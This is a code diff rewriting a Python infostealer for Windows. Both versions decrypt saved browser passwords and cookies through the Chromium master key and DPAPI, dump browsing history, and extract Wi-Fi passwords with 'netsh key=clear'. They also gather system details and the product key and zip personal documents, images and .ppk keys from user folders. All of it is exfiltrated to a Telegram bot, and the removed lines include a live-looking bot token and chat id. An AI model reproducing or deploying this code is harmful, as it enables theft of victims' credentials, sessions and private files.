@@ -1,33 +1,24 @@
 import os
-import winreg
+import sqlite3
+import json
+import base64
 import shutil
-import subprocess
-import zipfile
 import requests
-import re
-import time
-import ctypes
-import sys
+import subprocess
+import io
+import socket
+from Crypto.Cipher import AES
+import win32crypt
+import zipfile
+from screeninfo import get_monitors
 import psutil
 import pycountry
-from screeninfo import get_monitors
-from typing import Optional, Union
-import base64
-import json
-import random
-import sqlite3
-import threading
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
-import winshell
-from win32com.client import Dispatch
-import winreg as reg
-import win32crypt
+import time
 
-bot_token = '7481960829:AAFWLAti2xagba2MyBWDHBTChsR3__Ks2gM'
-chat_id = '-1002159253602'
+bot_token = 'BOT-TOKEN'
+chat_id = 'CHAT-ID'
 
-class BrowserDataCollector:
+class Browsers:
     def __init__(self):
         self.appdata = os.getenv('LOCALAPPDATA')
         self.roaming = os.getenv('APPDATA')
@@ -50,6 +41,7 @@ class BrowserDataCollector:
             'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
             'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
         }
+
         self.profiles = [
             'Default',
             'Profile 1',
@@ -58,455 +50,369 @@ class BrowserDataCollector:
             'Profile 4',
             'Profile 5',
         ]
-        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
-        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)
 
-        def process_browser(name, path, profile, func):
-            try:
-                func(name, path, profile)
-            except Exception:
-                pass
+    def get_encryption_key(self, browser_path):
+        local_state_path = os.path.join(browser_path, 'Local State')
+        if not os.path.exists(local_state_path):
+            return None
 
-        threads = []
-        for name, path in self.browsers.items():
-            if not os.path.isdir(path):
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state_data = json.load(f)
+
+        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
+        encrypted_key = encrypted_key[5:] 
+
+        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        return key
+
+    def decrypt_password(self, encrypted_password, key):
+        try:
+            iv = encrypted_password[3:15]
+            payload = encrypted_password[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted_password = cipher.decrypt(payload)[:-16].decode()
+            return decrypted_password
+        except Exception as e:
+            return None
+
+    def decrypt_cookie(self, encrypted_value, key):
+        try:
+            iv = encrypted_value[3:15]
+            payload = encrypted_value[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted_value = cipher.decrypt(payload)[:-16].decode()
+            return decrypted_value
+        except Exception as e:
+            return None
+
+    def send_telegram_message(self, file_data):
+        with io.BytesIO(file_data.getvalue()) as file:
+            file.name = 'data.zip' 
+            requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', 
+                          data={'chat_id': chat_id}, 
+                          files={'document': file})
+
+    def extract_passwords(self, zip_file):
+        for browser, browser_path in self.browsers.items():
+            if not os.path.exists(browser_path):
                 continue
 
-            self.masterkey = self.get_master_key(path + '\\Local State')
+            for profile in self.profiles:
+                login_db_path = os.path.join(browser_path, profile, 'Login Data')
+                if not os.path.exists(login_db_path):
+                    continue
 
-            self.funcs = [self.extract_passwords, self.extract_history, self.cookies]
+                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_LoginData.db")
+                shutil.copyfile(login_db_path, tmp_db_path)
+
+                conn = sqlite3.connect(tmp_db_path)
+                cursor = conn.cursor()
+
+                try:
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    key = self.get_encryption_key(browser_path)
+                    if not key:
+                        continue
+
+                    password_data = io.StringIO()
+                    password_data.write(f"Browser: {browser} | Profile: {profile}\n")
+                    password_data.write("=" * 120 + "\n")
+                    password_data.write(f"{'Website':<60} | {'Username':<30} | {'Password':<30}\n")
+                    password_data.write("=" * 120 + "\n")
+
+                    for row in cursor.fetchall():
+                        origin_url = row[0]
+                        username = row[1]
+                        encrypted_password = row[2]
+                        decrypted_password = self.decrypt_password(encrypted_password, key)
+
+                        if username and decrypted_password:
+                            password_data.write(f"{origin_url:<60} | {username:<30} | {decrypted_password:<30}\n")
+
+                    password_data.write("\n")  
+                    zip_file.writestr(f"browser/{browser}_passwords_{profile}.txt", password_data.getvalue())
+
+                except Exception as e:
+                    print(f"Error extracting from {browser}: {e}")
+
+                cursor.close()
+                conn.close()
+                os.remove(tmp_db_path)
+
+    def extract_cookies(self, zip_file):
+        for browser, browser_path in self.browsers.items():
+            if not os.path.exists(browser_path):
+                continue
 
             for profile in self.profiles:
-                for func in self.funcs:
-                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
-                    thread.start()
-                    threads.append(thread)
+                cookies_db_path = os.path.join(browser_path, profile, 'Network', 'Cookies')
+                if not os.path.exists(cookies_db_path):
+                    continue
 
-        for thread in threads:
-            thread.join()
+                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_Cookies.db")
+                try:
+                    shutil.copyfile(cookies_db_path, tmp_db_path)
+                except PermissionError:
+                    print(f"Không thể sao chép tệp {cookies_db_path}. Có thể tệp đang được sử dụng.")
+                    continue 
 
-        self.create_zip_and_send()
+                conn = sqlite3.connect(tmp_db_path)
+                cursor = conn.cursor()
 
-    def get_master_key(self, path: str) -> bytes:
-        try:
-            with open(path, "r", encoding="utf-8") as f:
-                local_state = json.load(f)
-            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = encrypted_key[5:]
-            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
-        except Exception:
-            return b''
+                try:
+                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                    key = self.get_encryption_key(browser_path)
+                    if not key:
+                        continue
 
-    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
-            return decrypted_pass
-        except Exception:
-            return ""
+                    cookie_data = io.StringIO()
+                    cookie_data.write(f"Browser: {browser} | Profile: {profile}\n")
+                    cookie_data.write("=" * 120 + "\n")
+                    cookie_data.write(f"{'Host':<60} | {'Cookie Name':<30} | {'Cookie Value':<30}\n")
+                    cookie_data.write("=" * 120 + "\n")
 
-    def extract_passwords(self, name: str, path: str, profile: str):
-        user_data_path = os.path.join(path, profile, 'Login Data')
-        if not os.path.isfile(user_data_path):
-            return
-        
-        temp_db_path = self.create_temp()
-        shutil.copy2(user_data_path, temp_db_path)
-        conn = sqlite3.connect(temp_db_path)
-        cursor = conn.cursor()
-        
-        passwords = []
-        for row in cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins"):
-            origin_url, action_url, username, encrypted_password = row
-            decrypted_password = self.decrypt_password(encrypted_password, self.masterkey)
-            if username or decrypted_password:
-                passwords.append({
-                    'browser': name,
-                    'profile': profile,
-                    'origin_url': origin_url,
-                    'action_url': action_url,
-                    'username': username,
-                    'password': decrypted_password
-                })
+                    for row in cursor.fetchall():
+                        host_key = row[0]
+                        name = row[1]
+                        encrypted_value = row[2]
+                        decrypted_value = self.decrypt_cookie(encrypted_value, key)
 
-        cursor.close()
-        conn.close()
-        os.remove(temp_db_path)
-        
-        if passwords:
-            filename = os.path.join(self.temp_path, "Browser", f"{name}_{profile}_passwords.txt")
-            self.save_data_to_file(passwords, filename)
+                        if host_key and name and decrypted_value:
+                            cookie_data.write(f"{host_key:<60} | {name:<30} | {decrypted_value:<30}\n")
 
-    def extract_history(self, name: str, path: str, profile: str):
-        history_db_path = os.path.join(path, profile, 'History')
-        if not os.path.isfile(history_db_path):
-            return
+                    cookie_data.write("\n") 
 
-        temp_db_path = self.create_temp()
-        shutil.copy2(history_db_path, temp_db_path)
-        conn = sqlite3.connect(temp_db_path)
-        cursor = conn.cursor()
-        
-        rows = cursor.execute("SELECT url, title, visit_count FROM urls").fetchall()
-        if rows:
-            filename = os.path.join(self.temp_path, "Browser", f"{name}_{profile}_history.txt")
-            with open(filename, "w", encoding="utf-8") as f:
-                for row in rows:
-                    f.write(f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\n\n")
 
-        cursor.close()
-        conn.close()
-        os.remove(temp_db_path)
+                    zip_file.writestr(f"browser/{browser}_cookies_{profile}.txt", cookie_data.getvalue())
 
-    def cookies(self, name: str, path: str, profile: str):
-        if name in ['opera', 'opera-gx']:
-            path += '\\Network\\Cookies'
-        else:
-            path += '\\' + profile + '\\Network\\Cookies'
-        if not os.path.isfile(path):
-            return
+                except Exception as e:
+                    print(f"Error extracting cookies from {browser}: {e}")
 
-        temp_db_path = self.create_temp()
-        shutil.copy2(path, temp_db_path)
-        conn = sqlite3.connect(temp_db_path)
-        cursor = conn.cursor()
-        
-        with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
-            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
-            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
-                host_key, name, path, encrypted_value, expires_utc = res
-                value = self.decrypt_password(encrypted_value, self.masterkey)
-                if host_key and name and value:
-                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
-        
-        cursor.close()
-        conn.close()
-        os.remove(temp_db_path)
+                cursor.close()
+                conn.close()
+                os.remove(tmp_db_path)
 
-    def save_data_to_file(self, data, filename):
-        with open(filename, 'w', encoding='utf-8') as file:
-            grouped_data = {}
-            for entry in data:
-                browser = entry['browser']
-                profile = entry['profile']
-                if browser not in grouped_data:
-                    grouped_data[browser] = {}
-                if profile not in grouped_data[browser]:
-                    grouped_data[browser][profile] = []
+    def extract_history(self, zip_file):
+        for browser, browser_path in self.browsers.items():
+            if not os.path.exists(browser_path):
+                continue
 
-                grouped_data[browser][profile].append(entry)
+            for profile in self.profiles:
+                history_db_path = os.path.join(browser_path, profile, 'History')
+                if not os.path.exists(history_db_path):
+                    continue
 
-            for browser, profiles in grouped_data.items():
-                for profile, entries in profiles.items():
-                    file.write(f"Browser: {browser} | Profile: {profile}\n")
-                    file.write(f"{'Website':<80} | {'Username':<30} | {'Password':<30}\n")
-                    file.write("=" * 140 + "\n")
+                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_History.db")
+                try:
+                    shutil.copyfile(history_db_path, tmp_db_path)
+                except PermissionError:
+                    print(f"Không thể sao chép tệp {history_db_path}. Có thể tệp đang được sử dụng.")
+                    continue 
 
-                    for entry in entries:
-                        website = entry['origin_url']
-                        username = entry.get('username', 'N/A')
-                        password = entry.get('password', 'N/A')
-                        file.write(f"{website:<80} | {username:<30} | {password:<30}\n")
+                conn = sqlite3.connect(tmp_db_path)
+                cursor = conn.cursor()
 
-                    file.write("=" * 140 + "\n")
+                try:
+                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
+                    history_data = io.StringIO()
+                    history_data.write(f"Browser: {browser} | Profile: {profile}\n")
+                    history_data.write("=" * 120 + "\n")
+                    history_data.write(f"{'URL':<80} | {'Title':<30} | {'Visit Count':<10} | {'Last Visit Time'}\n")
+                    history_data.write("=" * 120 + "\n")
 
-    def create_zip(self, file_paths: list, zip_path: str):
-        with zipfile.ZipFile(zip_path, 'w') as zipf:
-            for file in file_paths:
-                if os.path.isfile(file):
-                    zipf.write(file, os.path.basename(file))
+                    for row in cursor.fetchall():
+                        url = row[0]
+                        title = row[1]
+                        visit_count = row[2]
+                        last_visit_time = row[3]
 
-    def create_zip_and_send(self):
-        file_paths = [
-            os.path.join(self.temp_path, "Browser", "cookies.txt"),
-            *[os.path.join(self.temp_path, "Browser", f) for f in os.listdir(os.path.join(self.temp_path, "Browser")) if f.endswith('_passwords.txt') or f.endswith('_history.txt')]
-        ]
-        zip_file_path = os.path.join(self.temp_path, "BrowserData.zip")
-        self.create_zip(file_paths, zip_file_path)
-        self.send_file_to_telegram(zip_file_path)
+                        history_data.write(f"{url:<80} | {title:<30} | {visit_count:<10} | {last_visit_time}\n")
 
-        for file in file_paths:
-            if os.path.isfile(file):
-                os.remove(file)
-        if os.path.isfile(zip_file_path):
-            os.remove(zip_file_path)
+                    history_data.write("\n") 
+                    
+                    zip_file.writestr(f"browser/{browser}_history_{profile}.txt", history_data.getvalue())
 
-    def send_file_to_telegram(self, file_path: str):
-        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-        with open(file_path, 'rb') as file:
-            response = requests.post(
-                url,
-                files={'document': file},
-                data={'chat_id': chat_id}
-            )
-        if response.status_code == 200:
-            print("File sent successfully!")
-        else:
-            print("Failed to send file:", response.text)
-        return response
+                except Exception as e:
+                    print(f"Error extracting history from {browser}: {e}")
 
-    def create_temp(self) -> str:
-        if not os.path.exists(self.temp_path):
-            os.makedirs(self.temp_path)
-        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
-        path = os.path.join(self.temp_path, file_name)
-        open(path, "x").close()
-        return path
-
-class PcInfo:
-    def __init__(self):
-        self.username = "RSPVN"
-        self.get_system_info()
+                cursor.close()
+                conn.close()
+                os.remove(tmp_db_path)
 
     def get_country_code(self, country_name):
         try:
             country = pycountry.countries.lookup(country_name)
             return str(country.alpha_2).lower()
         except LookupError:
-            return "white"
+            return "unknown"
 
     def get_all_avs(self) -> str:
-        process = subprocess.run(
-            "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName",
-            shell=True, capture_output=True
-        )
-        if process.returncode == 0:
-            output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
-            if len(output) >= 2:
-                output = output[1:]
-                output = [av.strip() for av in output]
-                return ", ".join(output)
+        try:
+            process = subprocess.run(
+                "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName",
+                shell=True, capture_output=True
+            )
+            if process.returncode == 0:
+                output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
+                if len(output) >= 2:
+                    output = output[1:]
+                    output = [av.strip() for av in output]
+                    return ", ".join(output)
+            return "No Antivirus Found"
+        except Exception as e:
+            return f"Error: {str(e)}"
 
-    def get_screen_resolution(self):
-        monitors = get_monitors()
-        resolutions = [f"{monitor.width}x{monitor.height}" for monitor in monitors]
-        return ', '.join(resolutions)
+    def get_wifi_info(self):
+        wifi_data = io.StringIO()
+        wifi_data.write(f"WiFi Information\n")
+        wifi_data.write("=" * 40 + "\n")
+
+        try:
+            profiles = subprocess.run("netsh wlan show profiles", capture_output=True, shell=True).stdout.decode(errors='ignore')
+            for line in profiles.splitlines():
+                if "All User Profile" in line:
+                    profile_name = line.split(":")[1].strip()
+                    wifi_data.write(f"Profile: {profile_name}\n")
+                    password_cmd = f'netsh wlan show profile "{profile_name}" key=clear'
+                    password_info = subprocess.run(password_cmd, capture_output=True, shell=True).stdout.decode(errors='ignore')
+                    for password_line in password_info.splitlines():
+                        if "Key Content" in password_line:
+                            password = password_line.split(":")[1].strip()
+                            wifi_data.write(f"Password: {password}\n")
+                    wifi_data.write("\n")
+
+            gateway_info = subprocess.run("ipconfig", capture_output=True, shell=True).stdout.decode(errors='ignore')
+            for line in gateway_info.splitlines():
+                if "Default Gateway" in line:
+                    gateway = line.split(":")[1].strip()
+                    wifi_data.write(f"Default Gateway: {gateway}\n")
+                if "IPv4 Address" in line:
+                    ip_address = line.split(":")[1].strip()
+                    wifi_data.write(f"IP Address: {ip_address}\n")
+
+        except Exception as e:
+            wifi_data.write(f"Error retrieving WiFi info: {str(e)}\n")
+
+        return wifi_data.getvalue()
 
     def get_system_info(self):
-        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
-        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
-        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
-        ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
-                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
-        model = subprocess.run('wmic computersystem get model', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
-        username = os.getenv("UserName")
-        hostname = os.getenv("COMPUTERNAME")
-        uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
-        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"
+        system_info = io.StringIO()
+        system_info.write(f"System Information\n")
+        system_info.write("=" * 40 + "\n")
 
         try:
-            r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
-            if r["status"] != "success":
-                raise Exception("Failed")
-            country = r["country"]
-            proxy = r["proxy"]
-            ip = r["query"]
-        except Exception:
-            country = "Failed to get country"
-            proxy = "Failed to get proxy"
-            ip = "Failed to get IP"
-                  
-        _, addrs = next(iter(psutil.net_if_addrs().items()))
-        mac = addrs[0].address
+            process = subprocess.run("systeminfo", capture_output=True, shell=True)
+            if process.returncode == 0:
+                output = process.stdout.decode(errors="ignore").strip()
+                system_info.write(output + "\n")
+            else:
+                system_info.write("Error retrieving system information.\n")
+        except Exception as e:
+            system_info.write(f"Error: {str(e)}\n")
 
-        screen_resolution = self.get_screen_resolution()
-
-        message = f'''
-**PC Username:** `{username}`
-**PC Name:** `{hostname}`
-**Model:** `{model if model else "Unknown"}`
-**Screen Resolution:** `{screen_resolution}`
-**OS:** `{computer_os}`
-**Product Key:** `{product_key}`\n
-**IP:** `{ip}`
-**Country:** `{country}`
-**Proxy:** `{proxy}` if proxy else "None"
-**MAC:** `{mac}`
-**UUID:** `{uuid}`\n
-**CPU:** `{cpu}`
-**GPU:** `{gpu}`
-**RAM:** `{ram}GB`\n
-**Antivirus:** `{self.get_all_avs()}`
-        '''
-
-        self.send_message_to_telegram(message)
-
-    def send_message_to_telegram(self, message: str):
-        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        response = requests.post(
-            url,
-            data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
-        )
-        return response
-
-class Wifi:
-    def __init__(self):
-        self.networks = {}
-        self.get_networks()
-        self.send_info_to_telegram()
-
-    def run_command(self, command, encoding='utf-8'):
         try:
-            result = subprocess.run(command, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            return result.stdout.strip()
-        except subprocess.CalledProcessError as e:
-            return f"Error: {e}"
+            product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", 
+                                          capture_output=True, shell=True)
+            product_key_output = product_key.stdout.decode(errors='ignore').splitlines()
+            if len(product_key_output) > 2 and product_key_output[2].strip() != "":
+                system_info.write(f"Windows Product Key: {product_key_output[2].strip()}\n")
+            else:
+                system_info.write("Failed to get product key\n")
+        except Exception as e:
+            system_info.write(f"Error retrieving product key: {str(e)}\n")
 
-    def get_networks(self):
-        output_networks = self.run_command(["netsh", "wlan", "show", "profiles"])
-        profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profile" in line]
-        
-        for profile in profiles:
-            if profile:
-                profile_info = self.run_command(["netsh", "wlan", "show", "profile", profile, "key=clear"])
-                self.networks[profile] = self.extract_password(profile_info)
+        return system_info.getvalue()
 
-    def extract_password(self, profile_info):
-        match = re.search(r"Key Content\s*:\s*(.+)", profile_info)
-        return match.group(1).strip() if match else "No password found"
+    def create_zip_in_memory(self):
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, "w") as zip_file:
+            self.extract_passwords(zip_file)
+            self.extract_cookies(zip_file)
+            self.extract_history(zip_file)
 
-    def get_router_ip(self):
-        output = self.run_command("ipconfig")
-        router_ip = None
-        is_wifi = False
-        for line in output.splitlines():
-            if "Wireless Network Connection" in line or "Wireless LAN adapter" in line:
-                is_wifi = True
-            elif is_wifi and "Default Gateway" in line:
-                router_ip = line.split(":")[1].strip()
-                break
-        return router_ip if router_ip else "Failed to get router IP"
+            wifi_info = self.get_wifi_info()
+            zip_file.writestr("wifi_info.txt", wifi_info)
 
-    def get_mac_address(self):
-        router_ip = self.get_router_ip()
-        if router_ip == "Failed to get router IP":
-            return "Failed to get MAC address"
-        self.run_command(f"ping -n 1 {router_ip}") 
-        output = self.run_command(f"arp -a {router_ip}")
-        mac_address_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)
-        return mac_address_match.group() if mac_address_match else "MAC address not found"
+            system_info = self.get_system_info()
+            zip_file.writestr("system_info.txt", system_info)
 
-    def get_vendor_info(self, mac_address):
-        try:
-            url = f"https://api.macvendors.com/{mac_address}"
-            response = requests.get(url)
-            return response.text if response.status_code == 200 else "Vendor info not found"
-        except requests.RequestException as e:
-            return f"Error: {e}"
+            installed_apps = self.get_installed_apps()
+            zip_file.writestr("installed_apps.txt", installed_apps)
 
-    def send_info_to_telegram(self):
-        router_ip = self.get_router_ip()
-        mac_address = self.get_mac_address()
-        vendor_info = self.get_vendor_info(mac_address)
-        
-        message = f'''
-**Router IP Address:** `{router_ip}`
-**Router MAC Address:** `{mac_address}`
-**Router Vendor:** `{vendor_info}`
-**Saved Wi-Fi Networks:**
-'''
-        if self.networks:
-            for network, password in self.networks.items():
-                message += f"- `{network}`: `{password}`\n"
-        else:
-            message += "No Wi-Fi networks found."
+            self.extract_common_files(zip_file)
 
-        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        response = requests.post(
-            url,
-            data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
-        )
-        return response
-    
+        zip_buffer.seek(0) 
+        return zip_buffer
 
-temp_path = os.path.join(os.getenv('TEMP', '/tmp'), f'Common-Files-{os.getlogin()}')
-
-
-def is_connected():
-    try:
-        requests.get('https://www.google.com', timeout=5)
-        return True
-    except requests.ConnectionError:
-        return False
-
-def wait_for_network():
-    if not is_connected():
-        sys.exit()  
-
-
-class CommonFiles:
-    def __init__(self):
-        self.zipfile = os.path.join(temp_path, 'Common-Files.zip')
-        self.steal_common_files()
-        self.create_zip()
-        self.send_to_telegram()
-
-    def steal_common_files(self) -> None:
-        def _get_user_folder_path(folder_name):
-            try:
-                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders") as key:
-                    value, _ = winreg.QueryValueEx(key, folder_name)
-                    return value
-            except FileNotFoundError:
-                return None
-
-        personal_folders = [
-            "Desktop", "Personal", "Downloads", "My Pictures", "My Music", "My Videos", "Documents"
+    def extract_common_files(self, zip_file):
+        common_file_types = [
+            ".txt", ".rtf", ".odt", ".doc", ".docx",
+            ".pdf", ".csv", ".xls", ".xlsx", ".ods",
+            ".json", ".ppk", ".jpg", ".jpeg", ".png", ".gif"
         ]
-        
-        paths = [ _get_user_folder_path(folder) for folder in personal_folders ]
 
-        if not os.path.exists(temp_path):
-            os.makedirs(temp_path)
+        common_folders = [
+            os.path.join(os.path.expanduser("~"), "Desktop"),
+            os.path.join(os.path.expanduser("~"), "Documents"),
+            os.path.join(os.path.expanduser("~"), "Downloads"),
+            os.path.join(os.path.expanduser("~"), "Pictures"),
+            os.path.join(os.path.expanduser("~"), "Music"),
+            os.path.join(os.path.expanduser("~"), "Videos"),
+        ]
 
-        self.files_to_zip = []
+        zip_file.writestr("CommonFiles/", b'')
 
-        for search_path in paths:
-            if search_path and os.path.isdir(search_path):
-                self._process_directory(search_path)
+        for folder in common_folders:
+            if not os.path.exists(folder):
+                continue
 
-    def _process_directory(self, directory):
+            for root, _, files in os.walk(folder):
+                for file in files:
+                    if any(file.endswith(ext) for ext in common_file_types):
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.relpath(file_path, start=folder)  
+                        zip_file.write(file_path, f"CommonFiles/{arcname}") 
+    def get_installed_apps(self):
+        apps_data = io.StringIO()
+        apps_data.write(f"Installed Applications\n")
+        apps_data.write("=" * 40 + "\n")
+
         try:
-            for entry in os.listdir(directory):
-                full_path = os.path.join(directory, entry)
-                if os.path.isfile(full_path):
-                    if (any(x in entry.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")) 
-                        or entry.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".ods", ".json", ".ppk", ".jpg", ".jpeg", ".png", ".gif"))) \
-                        and not entry.endswith(".lnk") \
-                        and 0 < os.path.getsize(full_path) < 48 * 1024 * 1024: 
-                        self.files_to_zip.append(full_path)
-                elif os.path.isdir(full_path):
-                    self._process_directory(full_path)
-        except PermissionError:
-            pass
+            process = subprocess.run("tasklist", capture_output=True, shell=True)
+            if process.returncode == 0:
+                output = process.stdout.decode(errors="ignore").strip().splitlines()
+                for line in output[3:]: 
+                    apps_data.write(f"{line}\n")
+            else:
+                apps_data.write("Error retrieving installed applications.\n")
+        except Exception as e:
+            apps_data.write(f"Error: {str(e)}\n")
 
-    def create_zip(self):
-        with zipfile.ZipFile(self.zipfile, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for file in self.files_to_zip:
-                zipf.write(file, os.path.basename(file))
+        return apps_data.getvalue()
 
-    def send_to_telegram(self):
+    def check_internet_connection(self):
         try:
-            with open(self.zipfile, 'rb') as file:
-                files = {'document': file}
-                url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                payload = {'chat_id': chat_id}
-                response = requests.post(url, files=files, data=payload)
-                response.raise_for_status()
-        except requests.RequestException as e:
-            print(f'Failed to send file to Telegram: {e}')
-        except FileNotFoundError:
-            print(f'File {self.zipfile} not found.')
-
+            socket.create_connection(("www.google.com", 80))
+            return True
+        except OSError:
+            return False
 
 def main():
-    wait_for_network()   
-    BrowserDataCollector()  
-    PcInfo()      
-    Wifi()   
-    CommonFiles()
+    browser_extractor = Browsers()
+    print("Chờ 1 phút trước khi bắt đầu...")
+    time.sleep(60) 
+
+    try:
+        zip_buffer = browser_extractor.create_zip_in_memory()
+
+        while not browser_extractor.check_internet_connection():
+            print("Không có kết nối mạng. Đang chờ đợi...")
+            time.sleep(5)  
+
+        browser_extractor.send_telegram_message(zip_buffer)
+        print("Đã gửi dữ liệu thành công!")
+    except Exception as e:
+        print(f"Đã xảy ra lỗi: {e}")
+
 if __name__ == "__main__":
     main()
